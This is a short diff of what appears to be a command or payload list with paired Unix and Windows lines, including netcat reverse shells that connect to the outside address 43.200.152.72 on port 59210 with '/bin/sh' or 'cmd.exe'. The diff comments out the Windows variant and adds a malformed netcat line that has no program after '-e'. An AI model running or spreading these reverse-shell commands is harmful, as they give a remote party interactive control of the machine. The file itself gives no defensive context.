@@ -23,7 +23,8 @@ $mkdir /tmp/test >> /tmp/cmd_history.txt
 #mkdir c:\test2 >> c:\cmd_history.txt
 
 $nc 43.200.152.72 59210 -e /bin/sh
-#nc -e cmd.exe 43.200.152.72 59210
+//#nc -e cmd.exe 43.200.152.72 59210
+#nc -e 43.200.152.72 59210
 
 $echo >> /tmp/cmd_history.txt
 #echo. >> c:\cmd_history.txt
